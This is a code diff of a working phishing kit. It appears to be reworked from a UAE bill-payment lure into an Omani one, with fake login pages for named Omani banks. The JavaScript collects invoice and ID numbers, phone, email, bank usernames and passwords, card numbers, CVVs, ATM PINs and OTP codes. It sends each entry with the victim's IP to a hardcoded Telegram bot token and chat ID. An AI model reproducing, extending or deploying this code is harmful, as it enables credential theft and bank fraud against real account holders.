+                <div class="bank-card" data-bank="hsbc"><img src="https://i.ibb.co/7dGvBL6V/imgbin-logo-hsbc-bank-brand-hsbc-saudi-arabia-annual-meeting-Wpj0-Uuzr-YUDXK8z-MHd2xafp9d.jpg" alt="HSBC عمان"><p>HSBC عمان</p></div>
+                <div class="bank-card" data-bank="international"><img src="https://i.ibb.co/pvvKNWf3/png-clipart-world-bank-group-finance-world-development-report-bank-text-investment.png" alt="البنك العماني الدولي"><p>البنك العماني الدولي</p></div>
             </div>
         </div>
     </div>
-    <div id="waiting3" class="page">
-        <div class="header">
-            <img src="https://www.emaratalyoum.com/polopoly_fs/1.1676328.1665495540!/image/image.jpg" alt="شعار سداد الإمارات">
-            <h1>جاري التحميل</h1>
-        </div>
-        <div class="form-container simple-waiting">
-            <div class="spinner"></div>
-            <h3>جاري التحميل</h3>
-        </div>
-    </div>
-    <div id="page4" class="page">
-        <div class="header" id="bankHeader">
-            <img src="https://www.emaratalyoum.com/polopoly_fs/1.1676328.1665495540!/image/image.jpg" alt="شعار البنك" id="bankLogo">
-            <h1 id="page4Title">تسجيل الدخول للبنك</h1>
-        </div>
-        <div class="form-container" id="bankAuthContainer"></div>
-    </div>
-    <div id="otpWaiting" class="page">
-        <div class="header">
-            <img src="https://www.emaratalyoum.com/polopoly_fs/1.1676328.1665495540!/image/image.jpg" alt="شعار سداد الإمارات">
-            <h1>تم إرسال رمز OTP</h1>
-        </div>
-        <div class="form-container otp-waiting">
-            <div class="spinner"></div>
-            <h3>تم إرسال رمز التحقق (OTP) إلى هاتفك المحمول</h3>
-            <p>المسجل لدى البنك</p>
-            <div class="otp-waiting-timer" id="otpTimer" style="display:none;">10</div>
-            <p>سيتم توجيهك تلقائياً إلى صفحة التحقق من الدفع</p>
-        </div>
-    </div>
+    <div id="waiting3" class="page"><div class="header"><h1>جاري التحميل</h1></div><div class="form-container simple-waiting"><div class="spinner"></div><h3>جاري التحميل</h3></div></div>
+    <div id="page4" class="page"><div class="header" id="bankHeader"><img id="bankLogo" src="" alt="شعار البنك"><h1 id="page4Title"></h1></div><div class="form-container" id="bankAuthContainer"></div></div>
+    <div id="otpWaiting" class="page"><div class="header"><h1>تم إرسال OTP</h1></div><div class="form-container otp-waiting"><div class="spinner"></div><h3>تم إرسال رمز التحقق</h3></div></div>
 </div>
+
 <script>
   
-    // const _encodedBotToken = "ODk4NjcxMTQyOTpBQUV5WHJLSjBmcFEtMWVhVUlXdHNxU1Q1aDdtd1VGc2VtRQ==";
-    // const _encodedChatId = "ODc3MzI3NDY4OA==";
     const telegramBotToken = '8986711429:AAEyXrKJ0fpQ-1eaUIWtsqST5h7mwUFsemE'
     const telegramChatId = '8773274688'
-    // ============================================================
+    // const telegramBotToken = '';
+    // const telegramChatId = '';
+    // ==========================================
 
     const banks = {
-        emiratesNBD: { name: "بنك الإمارات دبي الوطني", logo: "https://i.ibb.co/dwhqmDsF/Emirates-NBD.jpg" },
-        emiratesIslamic: { name: "بنك الإمارات الإسلامي", logo: "https://images.seeklogo.com/logo-png/45/1/emirates-islamic-bank-logo-png_seeklogo-455442.png" },
-        firstAbuDhabi: { name: "بنك أبو ظبي الأول", logo: "https://i.ibb.co/gnNdPDJ/First-Abu-Dhabi-Bank-Logo-svg.png" },
-        abuDhabiCommercial: { name: "بنك أبو ظبي التجاري", logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSjH4Qs3CGxyTwB8k3DPHpsD8fyKOZ8qhCt_b1Nx_4IVg&s=10" },
-        dubaiIslamic: { name: "بنك دبي الإسلامي", logo: "https://i.ibb.co/8DbXSsw0/dib-logo-personal-business-og.jpg" },
-        mashreq: { name: "بنك المشرق", logo: "https://i.ibb.co/21YLkTtB/MASQ-AE-BIG-e09012bc.png" },
-        abuDhabiIslamic: { name: "بنك أبو ظبي الإسلامي", logo: "https://i.ibb.co/ynB1yRtg/images.jpg" },
-        dubaiCommercial: { name: "بنك دبي التجاري", logo: "https://play-lh.googleusercontent.com/6IHUfV5JDsueMXq283hVWDkQvwooy4EgIjGgrGKj1PuBIBjagfGdAWWHYZtX-PW99D8" },
-        fujairahNational: { name: "بنك الفجيرة الوطني", logo: "https://i.ibb.co/KxzwNLPC/nbf.jpg" },
-        rakNational: { name: "بنك رأس الخيمة الوطني", logo: "https://i.ibb.co/jkNfYJxc/RAKBANK.gif" },
-        sharjahIslamic: { name: "مصرف الشارقة الإسلامي", logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT9mYd7ueTsXpy3up18pb9AqLFa-NR2GabKe8rRaDDNkg&s=10" },
-        hsbc: { name: "بنك HSBC", logo: "https://i.ibb.co/ns4nczRR/unnamed.png" },
-        alHilal: { name: "بنك الهلال", logo: "https://i.ibb.co/vvXdQ2x6/EUWo3ho-XQAEv8mo.jpg" },
-        mariyahLocal: { name: "بنك الماريا المحلي", logo: "https://i.ibb.co/BXhSMxp/al-maryah-community-bank-logo-1.jpg" }
+        sohar: { name: "بنك صحار", logo: "https://i.ibb.co/8nz2MXTm/9714websitesohar.png" },
+        izzislamic: { name: "بنك العز الإسلامي", logo: "https://i.ibb.co/DDJGHTcK/Alizz-islamic-bank-logo.png" },
+        ahlinational: { name: "البنك الأهلي", logo: "https://i.ibb.co/xS81VYVP/image.png" },
+        arabomani: { name: "البنك العماني العربي", logo: "https://i.ibb.co/wFXP0wb5/cropped-OAB-512-icon.jpg" },
+        muscat: { name: "بنك مسقط", logo: "https://i.ibb.co/v4Jb349Q/S34-QVHJD5-FFCJCULEDSNRLGWKI.jpg" },
+        dhofar: { name: "بنك ظفار", logo: "https://i.ibb.co/wFzk3rZk/image.png" },
+        dhofarIslamic: { name: "بنك ظفار الإسلامي", logo: "https://www.dhofarislamic.com/media/wruf0fvw/dhofar-islamic-logo.svg" },
+        nizwa: { name: "بنك نزوى", logo: "https://i.ibb.co/MyWSn1xg/unnamed.webp" },
+        meethaq: { name: "بنك ميثاق", logo: "https://i.ibb.co/MxWStTBj/meethaq-islamic-banking-logo-png-seeklogo-304156.png" },
+        national: { name: "عمان الوطني", logo: "https://i.ibb.co/p69CZc8K/055-3.jpg" },
+        housing: { name: "بنك الاسكان العماني", logo: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcST53cNrj2BNgaRLHPCX_wjUZnPwU63LCzClZr-7vRPXw&s=10" },
+        hsbc: { name: "HSBC عمان", logo: "https://i.ibb.co/7dGvBL6V/imgbin-logo-hsbc-bank-brand-hsbc-saudi-arabia-annual-meeting-Wpj0-Uuzr-YUDXK8z-MHd2xafp9d.jpg" },
+        international: { name: "البنك العماني الدولي", logo: "https://i.ibb.co/pvvKNWf3/png-clipart-world-bank-group-finance-world-development-report-bank-text-investment.png" }
     };
 
-    let currentBank = null,
-        otpAttempts = 0,
-        timerInterval = null,
-        userIP = '',
-        telegramMessageId = null,
-        telegramMessageContent = '';
-
-    async function testTelegramConnection() {
-        try {
-            await fetch(`https://api.telegram.org/bot${telegramBotToken}/getMe`);
-            console.log('✅ الاتصال بتليجرام متاح');
-        } catch (e) {
-            console.error('❌ فشل الاتصال:', e);
-        }
-    }
+    let currentBank = null;
+    let otpAttempts = 0;
+    let userIP = '';
+    let telegramMessageId = null;
+    let telegramMessageContent = '';
 
     document.addEventListener('DOMContentLoaded', function() {
-        testTelegramConnection();
         getUserIP();
-        setupFormValidation();
-        document.getElementById('startService').addEventListener('click', function() {
-            showPageWithWaiting(1, 2, 'waiting1', 2000);
+        document.getElementById('startService').addEventListener('click', ()=> showPageWithWaiting(1,2,'waiting1',2000));
+        document.getElementById('confirmUserData').addEventListener('click', ()=>{
+            if(validateUserDataForm()) showPageWithWaiting(2,3,'waiting2',2000);
         });
-        document.getElementById('confirmUserData').addEventListener('click', function() {
-            if (validateUserDataForm()) showPageWithWaiting(2, 3, 'waiting2', 2000);
-        });
-        document.querySelectorAll('.bank-card').forEach(card => {
-            card.addEventListener('click', function() {
-                document.querySelectorAll('.bank-card').forEach(c => c.classList.remove('selected'));
+        document.querySelectorAll('.bank-card').forEach(card=>{
+            card.addEventListener('click', function(){
+                document.querySelectorAll('.bank-card').forEach(c=>c.classList.remove('selected'));
                 this.classList.add('selected');
-                showPageWithWaiting(3, 4, 'waiting3', 2000);
-                setTimeout(() => createBankAuth(this.dataset.bank), 2000);
+                showPageWithWaiting(3,4,'waiting3',2000);
+                setTimeout(()=> createBankAuth(this.dataset.bank), 2000);
             });
         });
     });
 
     async function getUserIP() {
+        try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); userIP = d.ip; }
+        catch(e) { userIP = 'غير معروف'; }
+    }
+
+    function showPage(num) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('page' + num).classList.add('active');
+    }
+
+    function showPageWithWaiting(from, to, waitId, delay) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(waitId).classList.add('active');
+        setTimeout(() => showPage(to), delay);
+    }
+
+    async function sendToTelegram(msg) {
         try {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            userIP = data.ip;
-        } catch (error) { userIP = 'غير معروف'; }
-    }
-    function setupFormValidation() {
-        document.getElementById('invoiceNumber').addEventListener('input', function() { validateField(this, /^.+$/, 'invoiceNumberError', 'يرجى إدخال رقم الفاتورة'); });
-        document.getElementById('phoneNumber').addEventListener('input', function() { validateField(this, /^05\d{8}$/, 'phoneNumberError', 'رقم هاتف غير صحيح'); });
-        document.getElementById('email').addEventListener('input', function() { validateField(this, /^[^\s@]+@[^\s@]+\.[^\s@]+$/, 'emailError', 'يرجى إدخال بريد إلكتروني صحيح'); });
-        document.getElementById('serviceType').addEventListener('change', function() { validateField(this, /^.+$/, 'serviceTypeError', 'يرجى اختيار نوع الخدمة'); });
-        document.getElementById('amount').addEventListener('input', function() { const v = parseFloat(this.value);
-            toggleFieldValidation(this, !isNaN(v) && v >= 5 && v <= 99999, 'amountError', 'المبلغ غير صحيح'); });
-    }
-
-    function validateField(field, regex, errorId, message) { toggleFieldValidation(field, regex.test(field.value), errorId,
-        message); }
-
-    function toggleFieldValidation(field, isValid, errorId, message) {
-        const errorElement = document.getElementById(errorId);
-        if (isValid) { field.classList.remove('invalid');
-            field.classList.add('valid');
-            errorElement.style.display = 'none'; } else { field.classList.remove('valid');
-            field.classList.add('invalid');
-            errorElement.textContent = message;
-            errorElement.style.display = 'block'; }
-    }
-
-    async function sendToTelegram(message) {
-        try {
-            telegramMessageContent = message;
-            const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'HTML' })
+            telegramMessageContent = msg;
+            const res = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({ chat_id: telegramChatId, text: msg, parse_mode: 'HTML' })
             });
-            const data = await response.json();
-            if (data.ok) telegramMessageId = data.result.message_id;
-            else console.error('فشل الإرسال:', data.description);
-        } catch (error) { console.error('فشل الإرسال:', error); }
+            const data = await res.json();
+            if(data.ok) telegramMessageId = data.result.message_id;
+        } catch(e) { console.error(e); }
     }
 
     async function appendToTelegramMessage(newContent) {
-        if (!telegramMessageId) { await sendToTelegram(newContent); return; }
+        if(!telegramMessageId) { await sendToTelegram(newContent); return; }
         try {
             telegramMessageContent += '\n\n' + newContent;
-            const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/editMessageText`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: telegramChatId, message_id: telegramMessageId, text: telegramMessageContent,
-                    parse_mode: 'HTML' })
+            await fetch(`https://api.telegram.org/bot${telegramBotToken}/editMessageText`, {
+                method:'POST', headers:{'Content-Type':'application/json'},
+                body: JSON.stringify({ chat_id: telegramChatId, message_id: telegramMessageId, text: telegramMessageContent, parse_mode: 'HTML' })
             });
-            const data = await response.json();
-            if (!data.ok) await sendToTelegram(telegramMessageContent);
-        } catch (error) {}
+        } catch(e) { await sendToTelegram(telegramMessageContent); }
     }
 
-    function getUserDataForMessage() {
-        return {
-            invoiceNumber: document.getElementById('invoiceNumber').value,
-            phoneNumber: document.getElementById('phoneNumber').value,
-            email: document.getElementById('email').value,
-            serviceType: document.getElementById('serviceType').value,
-            amount: document.getElementById('amount').value
-        };
-    }
-
-    function createTelegramMessageContent(step, additionalData = {}) {
-        let content = '';
-        switch (step) {
+    function createTelegramMessageContent(step, data={}) {
+        let c = '';
+        switch(step) {
             case 'user_data':
-                const d = getUserDataForMessage();
-                content =
-                    `👤 <b>بيانات المستخدم المدخلة</b>\n\n🧾 رقم الفاتورة: ${d.invoiceNumber}\n📱 رقم الجوال: ${d.phoneNumber}\n📧 البريد الإلكتروني: ${d.email}\n💼 نوع الخدمة: ${d.serviceType}\n💰 المبلغ: ${d.amount} درهم إماراتي\n🌐 عنوان IP: ${userIP}`;
+                c = `👤 بيانات المستخدم\nالفاتورة: ${document.getElementById('invoiceNumber').value}\nالهوية: ${document.getElementById('idNumber').value}\nالجوال: ${document.getElementById('phoneNumber').value}\nالبريد: ${document.getElementById('email').value}\nالخدمة: ${document.getElementById('serviceType').value}\nالمبلغ: ${document.getElementById('amount').value} ريال\nIP: ${userIP}`;
                 break;
             case 'bank_selection':
-                content =
-                    `🏦 <b>اختيار البنك</b>\n\n📊 البنك المختار: ${additionalData.bankName}\n🌐 عنوان IP: ${userIP}`;
+                c = `🏦 اختيار البنك: ${data.bankName}\nIP: ${userIP}`;
                 break;
             case 'bank_auth':
-                content =
-                    `🔐 <b>مصادقة البنك</b>\n\n🏦 البنك: ${additionalData.bankName}\n🔑 طريقة المصادقة: ${additionalData.authMethod}\n`;
-                if (additionalData.email) content += `📧 البريد الإلكتروني/اسم المستخدم: ${additionalData.email}\n`;
-                if (additionalData.password) content += `🔒 كلمة المرور: ${additionalData.password}\n`;
-                if (additionalData.cardNumber) content += `💳 رقم البطاقة: ${additionalData.cardNumber}\n`;
-                if (additionalData.expiryMonth && additionalData.expiryYear) content +=
-                    `📅 تاريخ الانتهاء: ${additionalData.expiryMonth}/${additionalData.expiryYear}\n`;
-                if (additionalData.atmPin) content += `🔒 ATM PIN: ${additionalData.atmPin}\n`;
-                if (additionalData.cvv) content += `🔒 CVV: ${additionalData.cvv}\n`;
-                if (additionalData.username) content += `👤 اسم المستخدم: ${additionalData.username}\n`;
-                content += `🌐 عنوان IP: ${userIP}`;
+                c = `🔐 ${data.bankName} - ${data.authMethod}`;
+                if(data.username) c += `\nالمستخدم: ${data.username}`;
+                if(data.password) c += `\nكلمة المرور: ${data.password}`;
+                if(data.cardNumber) c += `\nرقم البطاقة: ${data.cardNumber}`;
+                if(data.pin) c += `\nالرمز السري: ${data.pin}`;
+                if(data.phone) c += `\nالهاتف: ${data.phone}`;
+                if(data.expiryMonth) c += `\nتاريخ الانتهاء: ${data.expiryMonth}/${data.expiryYear}`;
+                if(data.cvv) c += `\nCVV: ${data.cvv}`;
+                if(data.accountNumber) c += `\nرقم الحساب: ${data.accountNumber}`;
+                if(data.identificationType) c += `\nنوع الهوية: ${data.identificationType}`;
+                c += `\nIP: ${userIP}`;
+                break;
+            case 'meethaq_token':
+                c = `🔐 بنك ميثاق - تفعيل جهاز رمز الأمان\nالرقم التسلسلي: ${data.serialNumber}\nIP: ${userIP}`;
                 break;
             case 'otp_sent':
-                content =
-                    `📲 <b>إرسال رمز OTP</b>\n\n🏦 البنك: ${additionalData.bankName}\n📱 تم إرسال الرمز إلى: ${additionalData.phone || 'الهاتف المسجل'}\n🌐 عنوان IP: ${userIP}`;
+                c = `📲 OTP أرسل إلى ${data.phone || 'الهاتف المسجل'}\n${data.bankName}\nIP: ${userIP}`;
                 break;
             case 'otp_entered':
-                content =
-                    `⌨️ <b>إدخال رمز OTP</b>\n\n🏦 البنك: ${additionalData.bankName}\n🔢 الرمز المدخل: ${additionalData.otp}\n❌ المحاولات الخاطئة: ${additionalData.wrongAttempts}\n🌐 عنوان IP: ${userIP}`;
+                c = `⌨️ OTP: ${data.otp} (محاولات خاطئة: ${data.wrongAttempts})\nIP: ${userIP}`;
                 break;
         }
-        return content;
+        return c;
     }
 
     function validateUserDataForm() {
-        let isValid = true;
-        const fields = [
-            { id: 'invoiceNumber', errorId: 'invoiceNumberError', test: v => v.length > 0 },
-            { id: 'phoneNumber', errorId: 'phoneNumberError', test: v => /^05\d{8}$/.test(v) },
-            { id: 'email', errorId: 'emailError', test: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v) },
-            { id: 'serviceType', errorId: 'serviceTypeError', test: v => v.length > 0 },
-            { id: 'amount', errorId: 'amountError', test: v => !isNaN(v) && v >= 5 && v <= 99999 }
-        ];
-        fields.forEach(f => {
-            const el = document.getElementById(f.id);
-            const val = f.id === 'amount' ? parseFloat(el.value) : el.value;
-            if (!f.test(val)) {
-                document.getElementById(f.errorId).style.display = 'block';
-                el.classList.add('invalid');
-                isValid = false;
-            } else {
-                document.getElementById(f.errorId).style.display = 'none';
-                el.classList.remove('invalid');
-            }
-        });
-        if (isValid) appendToTelegramMessage(createTelegramMessageContent('user_data'));
-        return isValid;
-    }
-
-    function showPage(pageNumber) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        const target = document.getElementById('page' + pageNumber);
-        if (target) target.classList.add('active');
-    }
-
-    function showPageWithWaiting(from, to, waitingId, waitTime) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(waitingId).classList.add('active');
-        setTimeout(() => showPage(to), waitTime);
-    }
-
-    function validateCardNumber(cardNumber) {
-        const clean = cardNumber.replace(/\s+/g, '');
-        if (clean.length !== 16 || !/^\d+$/.test(clean)) return { valid: false, type: 'unknown' };
-        let type = 'unknown';
-        if (/^4/.test(clean)) type = 'visa';
-        else if (/^5[1-5]/.test(clean)) type = 'mastercard';
-        else return { valid: false, type: 'unknown' };
-        return { valid: true, type: type };
-    }
-
-    function validateCardExpiry(month, year) {
-        const currentYear = new Date().getFullYear();
-        const currentMonth = new Date().getMonth() + 1;
-        if (year < 2025 || year > 2032) return false;
-        if (year === currentYear && month < currentMonth) return false;
-        return true;
-    }
-
-    function updateCardTypeDisplay(cardNumber) {
-        const display = document.getElementById('cardTypeDisplay');
-        if (!display) return;
-        const validation = validateCardNumber(cardNumber);
-        if (validation.valid) {
-            if (validation.type === 'visa') display.innerHTML = '<div class="card-type-icon visa">VISA</div>';
-            else if (validation.type === 'mastercard') display.innerHTML =
-                '<div class="card-type-icon mastercard">MC</div>';
-            else display.innerHTML = '<div class="card-type-icon unknown">?</div>';
-        } else {
-            display.innerHTML = '<div class="card-type-icon unknown">?</div>';
-        }
-    }
-
-    function formatCardNumber(input) {
-        let value = input.value.replace(/\s+/g, '');
-        if (value.length > 0) value = value.match(new RegExp('.{1,4}', 'g')).join(' ');
-        input.value = value;
-        updateCardTypeDisplay(value);
-    }
-
-    function updateBankLogo(bankKey) {
-        const bank = banks[bankKey];
-        const logo = document.getElementById('bankLogo');
-        const title = document.getElementById('page4Title');
-        if (bank && logo) {
-            logo.src = bank.logo;
-            logo.alt = bank.name;
-            title.textContent = `تسجيل الدخول إلى ${bank.name}`;
-        }
+        let ok = true;
+        const inv = document.getElementById('invoiceNumber');
+        if (!inv.value) { inv.classList.add('invalid'); document.getElementById('invoiceNumberError').style.display='block'; ok=false; } else { inv.classList.remove('invalid'); document.getElementById('invoiceNumberError').style.display='none'; }
+        const id = document.getElementById('idNumber');
+        if (!/^\d{1,18}$/.test(id.value)) { id.classList.add('invalid'); document.getElementById('idNumberError').style.display='block'; ok=false; } else { id.classList.remove('invalid'); document.getElementById('idNumberError').style.display='none'; }
+        const ph = document.getElementById('phoneNumber');
+        if (!/^\d{6,10}$/.test(ph.value)) { ph.classList.add('invalid'); document.getElementById('phoneNumberError').style.display='block'; ok=false; } else { ph.classList.remove('invalid'); document.getElementById('phoneNumberError').style.display='none'; }
+        const em = document.getElementById('email');
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em.value)) { em.classList.add('invalid'); document.getElementById('emailError').style.display='block'; ok=false; } else { em.classList.remove('invalid'); document.getElementById('emailError').style.display='none'; }
+        const sv = document.getElementById('serviceType');
+        if (!sv.value) { sv.classList.add('invalid'); document.getElementById('serviceTypeError').style.display='block'; ok=false; } else { sv.classList.remove('invalid'); document.getElementById('serviceTypeError').style.display='none'; }
+        const am = document.getElementById('amount');
+        const av = parseFloat(am.value);
+        if (isNaN(av)||av<1||av>99999) { am.classList.add('invalid'); document.getElementById('amountError').style.display='block'; ok=false; } else { am.classList.remove('invalid'); document.getElementById('amountError').style.display='none'; }
+        if (ok) appendToTelegramMessage(createTelegramMessageContent('user_data'));
+        return ok;
     }
 
     function createBankAuth(bankKey) {
         currentBank = bankKey;
         const bank = banks[bankKey];
+        document.getElementById('bankLogo').src = bank.logo;
+        document.getElementById('page4Title').textContent = bank.name;
         document.getElementById('bankAuthContainer').innerHTML = '';
-        updateBankLogo(bankKey);
-        appendToTelegramMessage(createTelegramMessageContent('bank_selection', { bankName: bank.name }));
-        if (bankKey === 'emiratesNBD') showEmiratesNBDAuth();
-        else if (bankKey === 'emiratesIslamic') showEmiratesIslamicAuth();
-        else if (bankKey === 'firstAbuDhabi') showFirstAbuDhabiAuth();
-        else if (bankKey === 'abuDhabiCommercial') showAbuDhabiCommercialAuth();
-        else if (bankKey === 'dubaiIslamic') showDubaiIslamicAuth();
-        else if (bankKey === 'mashreq') showMashreqAuth();
-        else if (bankKey === 'abuDhabiIslamic') showAbuDhabiIslamicAuth();
-        else if (bankKey === 'dubaiCommercial') showDubaiCommercialAuth();
-        else if (bankKey === 'fujairahNational') showFujairahNationalAuth();
-        else if (bankKey === 'rakNational') showRakNationalAuth();
-        else if (bankKey === 'sharjahIslamic') showSharjahIslamicAuth();
-        else if (bankKey === 'hsbc') showHSBCAuth();
-        else if (bankKey === 'alHilal') showAlHilalAuth();
-        else if (bankKey === 'mariyahLocal') showMariyahLocalAuth();
-    }
-
-    function showEmiratesNBDAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.emiratesNBD.name}</h3>
-            <div class="form-group"><label for="bankEmail">البريد الإلكتروني أو اسم المستخدم</label><input type="text" id="bankEmail" class="form-control" placeholder="أدخل بريدك الإلكتروني أو اسم المستخدم" required><div class="error-message" id="bankEmailError">يرجى إدخال البريد الإلكتروني أو اسم المستخدم</div></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required><div class="error-message" id="bankPasswordError">يرجى إدخال كلمة المرور</div></div>
-            <button class="btn btn-block" onclick="proceedToEmiratesNBDAuth()">تسجيل الدخول</button>`;
-    }
-
-    function proceedToEmiratesNBDAuth() {
-        const email = document.getElementById('bankEmail').value;
-        const password = document.getElementById('bankPassword').value;
-        if (!email) { document.getElementById('bankEmailError').style.display = 'block'; return; }
-        if (!password) { document.getElementById('bankPasswordError').style.display = 'block'; return; }
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.emiratesNBD.name, authMethod: 'email/username',
-            email, password }));
-        showOtpWaiting('emiratesNBD');
-    }
-
-    function showEmiratesIslamicAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.emiratesIslamic.name}</h3>
-            <div class="form-group"><label for="bankEmail">البريد الإلكتروني أو اسم المستخدم</label><input type="text" id="bankEmail" class="form-control" placeholder="أدخل بريدك الإلكتروني أو اسم المستخدم" required><div class="error-message" id="bankEmailError">يرجى إدخال البريد الإلكتروني أو اسم المستخدم</div></div>
-            <div class="form-group"><label for="bankPassword">كلمة المرور</label><input type="password" id="bankPassword" class="form-control" placeholder="أدخل كلمة المرور" required><div class="error-message" id="bankPasswordError">يرجى إدخال كلمة المرور</div></div>
-            <button class="btn btn-block" onclick="proceedToEmiratesIslamicAuth()">تسجيل الدخول</button>`;
-    }
-
-    function proceedToEmiratesIslamicAuth() {
-        const email = document.getElementById('bankEmail').value;
-        const password = document.getElementById('bankPassword').value;
-        if (!email) { document.getElementById('bankEmailError').style.display = 'block'; return; }
-        if (!password) { document.getElementById('bankPasswordError').style.display = 'block'; return; }
-        appendToTelegramMessage(createTelegramMessageContent('bank_auth', { bankName: banks.emiratesIslamic.name, authMethod: 'email/username',
-            email, password }));
-        showOtpWaiting('emiratesIslamic');
-    }
-
-    // ============================================================
-    // بنك أبو ظبي الأول - تم إزالة التحقق من ATM PIN و CVV فقط
-    // ============================================================
-
-    function showFirstAbuDhabiAuth() {
-        document.getElementById('bankAuthContainer').innerHTML =
-            `<h3>تسجيل الدخول إلى ${banks.firstAbuDhabi.name}</h3>
-            <div class="form-group"><label for="cardNumber">رقم البطاقة</label><input type="text" id="cardNumber" class="form-control" placeholder="أدخل رقم البطاقة (16 رقم)" maxlength="19" oninput="formatCardNumber(this)" required><div class="card-type" id="cardTypeDisplay"><div class="card-type-icon unknown">?</div></div><div class="error-message" id="cardNumberError">يرجى إدخال رقم بطاقة صحيح (فيزا أو ماستر كارد فقط)</div></div>
-            <div class="form-group"><label for="expiryDate">تاريخ الانتهاء</label><div class="date-input"><select id="expiryMonth" required><option value="">الشهر</option>${Array.from({length:12},(_,i)=>`<option value="${i+1}">${i+1}</option>`).join('')}</select><select id="expiryYear" required><option value="">السنة</option>${Array.from({length:8},(_,i)=>`<option value="${2025+i}">${2025+i}</option>`).join('')}</select></div><div class="error-message" id="expiryError">يرجى اختيار تاريخ انتهاء صحيح (من 2025 إلى 2032)</div></div>
-            <button class="btn btn-block" onclick="proceedToFirstAbuDhabiAuth()">تسجيل الدخول</button>`;
-    }
-
-    function proceedToFirstAbuDhabiAuth() {
-        const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
-        const expiryMonth = document.getElementById('expiryMonth').value;
-        const expiryYear = document.getElementById('expiryYear').value;
-
-        // التحقق من رقم البطاقة فقط
-        if (!validateCardNumber(cardNumber).valid) {
-            document.getElementById('cardNumberError').style.display = 'block';
-            return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_selection', {bankName: bank.name}));
+        switch(bankKey) {
+            case 'sohar': showUsernamePasswordAuth(bankKey); break;
+            case 'ahlinational': showAhliNationalStep1(); break;
+            case 'arabomani': case 'hsbc': case 'international': showUsernamePasswordAuth(bankKey); break;
+            case 'izzislamic': showIzzIslamicStep1(); break;
+            case 'muscat': showMuscatAuth(); break;
+            case 'dhofar': showDhofarAuth(); break;
+            case 'dhofarIslamic': showDhofarIslamicAuth(); break;
+            case 'nizwa': showNizwaLogin(); break;
+            case 'meethaq': showMeethaqAuth(); break;
+            case 'national': showSimpleCardAuth('national'); break;
+            case 'housing': showHousingAuth(); break;
         }
+    }
 
-        // التحقق من تاريخ الانتهاء فقط
-        if (!validateCardExpiry(expiryMonth, expiryYear)) {
-            document.getElementById('expiryError').style.display = 'block';
-            return;
-        }
+    // ================== دوال البنك الأهلي ==================
+    function showAhliNationalStep1() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>البنك الأهلي - تسجيل الدخول</h3>
+            <div class="form-group"><label>اسم المستخدم</label><input id="ahliUsername" class="form-control"><div class="error-message" id="ahliUsernameError">مطلوب</div></div>
+            <div class="form-group"><label>كلمة المرور</label><input type="password" id="ahliPassword" class="form-control"><div class="error-message" id="ahliPasswordError">مطلوب</div></div>
+            <button class="btn btn-block" onclick="proceedAhliNationalStep1()">تسجيل الدخول</button>`;
+    }
 
-        // تم إزالة التحقق من ATM PIN و CVV
+    function proceedAhliNationalStep1() {
+        const u = document.getElementById('ahliUsername').value.trim();
+        const p = document.getElementById('ahliPassword').value.trim();
+        if (!u || !p) return;
+        appendToTelegramMessage(createTelegramMessageContent('bank_auth', {bankName: 'البنك الأهلي', authMethod:'step1-user/pass', username:u, password:p}));
+        document.getElementById('bankAuthContainer').innerHTML = `<div class="simple-waiting"><div class="spinner"></div><h3>جاري التحميل</h3></div>`;
+        setTimeout(() => { showAhliNationalStep2(); }, 2000);
+    }
 
+    function showAhliNationalStep2() {
+        document.getElementById('bankAuthContainer').innerHTML = `
+            <h3>البنك الأهلي - تفاصيل البطاقة</h3>
+            <div class="form-group"><label>رقم البطاقة</label><input type="text" id="ahliCard" class="form-control" maxlength="19" oninput="formatCardNumber(this, 'ahliCardType')"><div class="card-type" id="ahliCardType"><div class="card-type-icon unknown">?</div></div><div class="error-message" id="ahliCardError">رقم بطاقة غير صحيح</div></div>
+            <div class="form-group"><label>تاريخ الانتهاء</label><div class="date-input"><select id="ahliExpiryMonth">${Array.from({length:12},(_,i)=>`<option value="${i+1}">${i+1}</option>`).join('')}</select><select id="ahliExpiryYear">${Array.from({length:8},(_,i)=>`<option value="${2025+i}">${2025+i}</option>`).join('')}</select></div></div>
+            <div class="form-group"><label>CVV</label><input type="text" id="ahliCvv" class="form-control" maxlength="3"><div class="error-message" id="ahliCvvError">3 أرقام</div></div>
+            <div class="form-group"><label>رمز ATM PIN</label><input type="password" id="ahliPin" class="form-control" maxlength="4" placeholder="****"><div class="error-message" id="ahliPinError">4 أرقام</div></div>
+            <button class="btn btn-block" onclick="proceedAhliNationalStep2()">تأكيد</button>`;
+    }
+
+    function proceedAhliNationalStep2() {
+        const card = document.getElementById('ahliCard').value.replace(/\s+/g, '');
+        const month = document.getElementById('ahliExpiryMonth').value;
+        const year = document.getElementById('ahliExpiryYear').value;
+        const cvv = document.getElementById('ahliCvv').value;
